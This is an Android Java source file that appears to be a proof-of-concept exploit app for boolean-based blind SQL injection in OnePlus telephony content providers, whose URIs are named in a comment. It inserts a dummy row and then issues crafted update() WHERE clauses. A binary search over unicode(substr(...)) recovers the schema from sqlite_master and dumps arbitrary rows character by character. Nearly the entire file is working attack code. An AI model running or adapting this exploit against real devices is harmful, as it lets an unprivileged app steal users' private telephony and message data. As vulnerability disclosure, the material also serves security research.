package poc.chutchut.cpblindsqli;

import android.content.ContentValues;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "MainActivity";

    public static final String ROW_CONCAT_DELIM = "!!";

    private TextView queryLogTxt;
    private Button triggerSqliBtn;
    private EditText sqlTxt;

    private HashMap<String, String> tblCreateMap = new HashMap<>();
    private String qTbl;
    private int dumpLimit = -1;

    private class ExecQueryAsync extends AsyncTask<Void, Void, Void> {

        private String sql;
        private Uri uri;

        public ExecQueryAsync(Uri uri, String sql) {
            this.uri = uri;
            this.sql = sql;
        }

        @Override
        protected void onPreExecute() {
            queryLogTxt.setText("");
            dumpLimit = -1;
            qTbl = null;
            triggerSqliBtn.setEnabled(false);
        }

        @Override
        protected Void doInBackground(Void... voids) {
            Uri insUri = null;
            try {
                // Insert dummy row into provider
                ContentValues dummyValues = new ContentValues();
                dummyValues.put("rowid", "999");
                insUri = getContentResolver().insert(uri, dummyValues);
                if (insUri != null) {
                    Log.i(TAG, "Got URI after successful insert: " + insUri);
                } else {
                    Log.i(TAG, "Null URI returned for insert");
                }
                // Get row data
                getRows(uri, sql);
            } catch (Exception e) {
                logFromThread("Exception getting row data: " + e.getMessage());
                e.printStackTrace();
            } finally {
                // If the insert uri is not null try to clean up with a delete
                if (insUri != null) {
                    int res = getContentResolver().delete(insUri, "rowid = 999", null);
                    Log.i(TAG, "Attempted to clean non-null insert URI with delete: " + res);
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            triggerSqliBtn.setEnabled(true);
            qTbl = null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        queryLogTxt = findViewById(R.id.txtLog);
        triggerSqliBtn = findViewById(R.id.btnDumpData);
        sqlTxt = findViewById(R.id.txtSql);

        queryLogTxt.setMovementMethod(new ScrollingMovementMethod());
        triggerSqliBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String query = sqlTxt.getText().toString().trim();
                if (!query.isEmpty()) {
                    // Content Providers vulnerable to SQLi in OnePlus implementation of com.android.providers.telephony
                    // (Confirmed on on OxygenOS 12/14/15)
                    // content://service-number/service_number
                    // content://push-mms/push
                    // content://push-shop/push_shop
                    new ExecQueryAsync(Uri.parse("content://service-number/service_number"), query).execute();
                } else {
                    Toast.makeText(getApplicationContext(), "No query entered", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    private void logFromThread(final String msg) {
        try {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    queryLogTxt.append(msg + "\n");
                }
            });
            Log.i(TAG, msg);
        } catch (Exception e) {
            Log.e(TAG, "Exception writing log text from thread");
        }
    }

    private String getCreateStatementForTable(Uri uri, String table) {
        String[] row = getRow(uri, String.format("SELECT sql FROM sqlite_master WHERE type = 'table' AND tbl_name = '%s'", table), 0);
        if (row != null && row.length > 0) {
            return row[0];
        }
        return null;
    }

    private ArrayList<String> getCreateCols(String query) {
        ArrayList<String> cols = new ArrayList<>();
        // Strip any gravess
        query = query.replace("`", "");
        Pattern p1 = Pattern.compile("CREATE\\s+TABLE\\s+[\"']?\\w+[\"']?\\s*\\(((.|\\n)+)\\)", Pattern.CASE_INSENSITIVE);
        Matcher getCreateFields = p1.matcher(query);
        if (getCreateFields.find()) {
            String[] fieldSplit = getCreateFields.group(1).split(",");
            for (int i = 0; i < fieldSplit.length; i++) {
                String[] fieldElementSplit = fieldSplit[i].trim().split(" ");
                String fieldToAdd = fieldElementSplit[0];
                if (fieldToAdd.matches("^[0-9A-Za-z-_]+[0-9a-z-_]+$")) {
                    // Dont add ALL CAPS fields, they are probably keywords (i.e. UNIQUE)
                    // Also ignore fields with invalid chars
                    cols.add(fieldToAdd);
                }
            }
        }
        return cols;
    }

    private ArrayList<String> getTableFields(String table) {
        String tblCreate = tblCreateMap.get(table);
        if (tblCreate != null) {
            return getCreateCols(tblCreate);
        }
        return null;
    }

    private void getRows(Uri uri, String query) {
        QueryParser queryParser = new QueryParser(query);
        if (!queryParser.getCols(null).isEmpty() || queryParser.isWildcard()) {
            int[] limit = queryParser.getLimitOffset();
            String table = queryParser.getFrom();
            // Check for LIMIT, save the num and strip it from the query
            if (limit != null) {
                dumpLimit = limit[0];
                query = queryParser.removeLimitOffset();
            }
            // Get the table
            if (table != null) {
                qTbl = table;
            }
        } else {
            logFromThread("Failed to parse SQL");
            return;
        }

        if (queryParser.isWildcard() && qTbl != null) {
            // Wildcard query, find fields
            String tblCreate;
            if (!tblCreateMap.containsKey(qTbl)) {
                // Get the fields from the create statement
                logFromThread("Getting CREATE statement for table: " + qTbl);
                tblCreate = getCreateStatementForTable(uri, qTbl);
                if (tblCreate == null) {
                    logFromThread("Failed to get CREATE statement");
                    return;
                }
                tblCreateMap.put(qTbl, tblCreate);
            } else {
                tblCreate = tblCreateMap.get(qTbl);
            }

            ArrayList<String> fields;
            StringBuilder fieldStr = new StringBuilder();
            if (!(fields = getCreateCols(tblCreate)).isEmpty()) {
                boolean first = true;
                for (String field : fields) {
                    if (!first) {
                        fieldStr.append(", ");
                    } else {
                        first = false;
                    }
                    fieldStr.append(field);
                }
                query = query.replaceFirst("(?i)SELECT\\s+\\*\\s+FROM", "SELECT " + fieldStr + " FROM");
            } else {
                logFromThread("Failed to get CREATE fields for table: " + qTbl);
                return;
            }
        }

        // Use concat operators and markers to split the output into individual fields
        int fromIndex = query.toLowerCase().indexOf(" from ");
        if (fromIndex != -1 && query.substring(0, fromIndex).contains(",")) {
            query = query.substring(0, fromIndex).replace(",", " || '" + ROW_CONCAT_DELIM + "' || ") + query.substring(fromIndex);
        }

        logFromThread(String.format("Dumping data via blind SQLi for query '%s', Uri: %s", query, uri));

        // Get the number of rows of the result set
        int numRows;
        String[] countRow = getRow(uri, String.format(Locale.getDefault(), "SELECT COUNT(*) FROM (%s)", query), 0);
        if (countRow == null || countRow.length == 0) {
            logFromThread("No rows returned, cannot continue");
            return;
        } else {
            numRows = Integer.parseInt(countRow[0]);
            logFromThread(String.format(Locale.getDefault(), "Query will return %d row(s)", numRows));
        }

        ArrayList<String[]> rows = new ArrayList<>();
        for (int i = 0; i < numRows && (dumpLimit == -1 || i < dumpLimit); i++) {
            String[] dataRow = getRow(uri, query, i);
            if (dataRow != null) {
                rows.add(dataRow);
            }
        }
        for (int i = 0; i < rows.size(); i++) {
            StringBuilder sb = new StringBuilder(String.format(Locale.getDefault(), "Row %d: ", i + 1));
            for (String field : rows.get(i)) {
                sb.append(field);
                sb.append(" | ");
            }
            logFromThread(sb.toString());
        }
    }

    private String[] getRow(Uri uri, String query, int rowIndex) {
        // Use offset/limit to get one row at a time
        query = query + " LIMIT 1 OFFSET " + rowIndex;
        char lastChar;
        int charIndex = 0;
        StringBuilder charStringBuilder = new StringBuilder();
        // Iterate until getChar returns null (i.e. on error or end of result)
        while ((lastChar = getChar(uri, query, charIndex)) != 0) {
            logFromThread(String.format(Locale.getDefault(), "Got char for row %d at index %d: %s", rowIndex + 1, charIndex, lastChar));
            charStringBuilder.append(lastChar);
            charIndex++;
        }
        if (!charStringBuilder.toString().trim().isEmpty()) {
            String rowStr = charStringBuilder.toString();
            if (rowStr.contains(ROW_CONCAT_DELIM)) {
                return rowStr.split(ROW_CONCAT_DELIM, -1);
            } else {
                return new String[] {rowStr};
            }
        } else if (qTbl != null && getTableFields(qTbl) != null) {
            // Get fields for the row individually in case they cannot be concatenated
            boolean first = true;
            for (String field : getTableFields(qTbl)) {
                charIndex = 0;
                if (!first) {
                    charStringBuilder.append(ROW_CONCAT_DELIM);
                } else {
                    first = false;
                }
                while ((lastChar = getChar(uri, String.format(Locale.getDefault(), "SELECT %s FROM %s LIMIT 1 OFFSET %d", field, qTbl, rowIndex), charIndex)) != 0) {
                    logFromThread(String.format(Locale.getDefault(), "Got char at index %d: %s", charIndex, lastChar));
                    charStringBuilder.append(lastChar);
                    charIndex++;
                }
            }
            return charStringBuilder.toString().split(ROW_CONCAT_DELIM, -1);
        } else {
            logFromThread("Failed to get chars of row " + (rowIndex + 1));
        }
        return null;
    }

    private char getChar(Uri uri, String query, int charIndex) {
        ContentValues vals = new ContentValues();
        vals.put("rowid", "123");
        int min = 0;
        int window = 127;
        while (true) {
            String where = String.format(Locale.getDefault(), "1=1 AND unicode(substr((%s), %d, 1)) BETWEEN %d AND %d", query, charIndex + 1, min, (min + window));
            if (boolExploitUpdate(uri, vals, where)) {
                if (window == 0) {
                    // Got result
                    return (char) min;
                } else {
                    // True, reduce window
                    if (window > 3) {
                        window = window / 2;
                    } else {
                        window--;
                    }
                }
            } else {
                if (min == 0 && window == 127) {
                    // Invalid char (must be between 0 and 127)
                    return 0;
                } else {
                    if (window > 0) {
                        // False, min becomes last max
                        min = min + window;
                    } else {
                        min++;
                    }
                }
            }
        }
    }

    private boolean boolExploitUpdate(Uri uri, ContentValues values, String where) {
        try {
            return getContentResolver().update(uri, values, where,null) > 0;
        } catch (Exception e) {
            if (e.getMessage() != null && e.getMessage().contains("UNIQUE constraint failed")) {
                // Check for constraint error, which means the update was attempted so return true
                return true;
            }
            Log.e(TAG, "Exception performing exploit query: " + e.getMessage());
        }
        return false;
    }
}
